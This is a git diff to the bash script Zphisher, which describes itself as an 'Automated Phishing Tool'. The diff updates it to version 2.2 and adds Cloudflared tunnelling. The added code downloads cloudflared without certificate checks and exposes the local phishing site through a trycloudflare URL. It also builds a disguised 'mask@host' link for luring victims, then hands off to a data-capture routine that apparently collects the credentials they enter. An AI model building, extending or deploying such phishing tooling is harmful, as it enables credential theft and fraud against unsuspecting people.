@@ -2,11 +2,12 @@
 
 ##   Zphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.1
+##   Version 	: 	2.2
 ##   Github 	: 	https://github.com/htr-tech
 
 ##   THANKS TO :
 ##   Aditya Shakya - https://github.com/adi1090x
+##   1RaY-1 - https://github.com/1RaY-1
 ##   Moises Tapia - https://github.com/MoisesTapia
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 ##   DarksecDevelopers  - https://github.com/DarksecDevelopers
@@ -110,6 +111,9 @@ if [[ -d ".server/www" ]]; then
 else
 	mkdir -p ".server/www"
 fi
+if [[ -e ".cld.log" ]]; then
+	rm -rf ".cld.log"
+fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
@@ -139,7 +143,10 @@ kill_pid() {
 	fi
 	if [[ `pidof ngrok` ]]; then
 		killall ngrok > /dev/null 2>&1
-	fi	
+	fi
+	if [[ `pidof cloudflared` ]]; then
+		killall cloudflared > /dev/null 2>&1
+	fi
 }
 
 ## Banner
@@ -153,7 +160,7 @@ banner() {
 		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
 		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
 		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.1
+		${ORANGE}      |_|                ${RED}Version : 2.2
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
 	EOF
@@ -165,7 +172,7 @@ banner_small() {
 		${BLUE}
 		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
 		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.1
+		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.2
 	EOF
 }
 
@@ -228,6 +235,23 @@ download_ngrok() {
 	fi
 }
 
+## Download Cloudflared
+download_cloudflared() {
+	url="$1"
+	file=`basename $url`
+	if [[ -e "$file" ]]; then
+		rm -rf "$file"
+	fi
+	wget --no-check-certificate "$url" > /dev/null 2>&1
+	if [[ -e "$file" ]]; then
+		mv -f "$file" .server/cloudflared > /dev/null 2>&1
+		chmod +x .server/cloudflared > /dev/null 2>&1
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
+		{ reset_color; exit 1; }
+	fi
+}
+
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
@@ -249,6 +273,26 @@ install_ngrok() {
 
 }
 
+## Install Cloudflared
+install_cloudflared() {
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		case $arch in 
+			arm | Android)
+				download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm';;
+			aarch64)
+				download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64';;
+			x86_64)
+				download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64';;
+			*)
+				download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386';;
+		esac
+	fi
+}
+
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
@@ -263,10 +307,10 @@ about() {
 		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
 		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
-		${GREEN}Version  ${RED}:  ${ORANGE}2.1
+		${GREEN}Version  ${RED}:  ${ORANGE}2.2
 
 		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Mustakim Ahmed ${RESETBG}
+								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -358,6 +402,30 @@ start_ngrok() {
 	capture_data
 }
 
+
+## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
+
+## Start Cloudflared
+start_cloudflared() { 
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+    if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+    else
+        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+    fi
+
+	{ sleep 8; clear; banner_small; }
+	
+	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
+	cldflr_link1=${cldflr_link#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	capture_data
+}
+
 ## Start localhost
 start_localhost() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
@@ -372,8 +440,9 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
-		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Best${RED}]
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
 
 	EOF
 
@@ -384,6 +453,8 @@ tunnel_menu() {
 			start_localhost;;
 		2 | 02)
 			start_ngrok;;
+		3 | 03)
+			start_cloudflared;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
@@ -683,4 +754,5 @@ main_menu() {
 kill_pid
 dependencies
 install_ngrok
+install_cloudflared
 main_menu
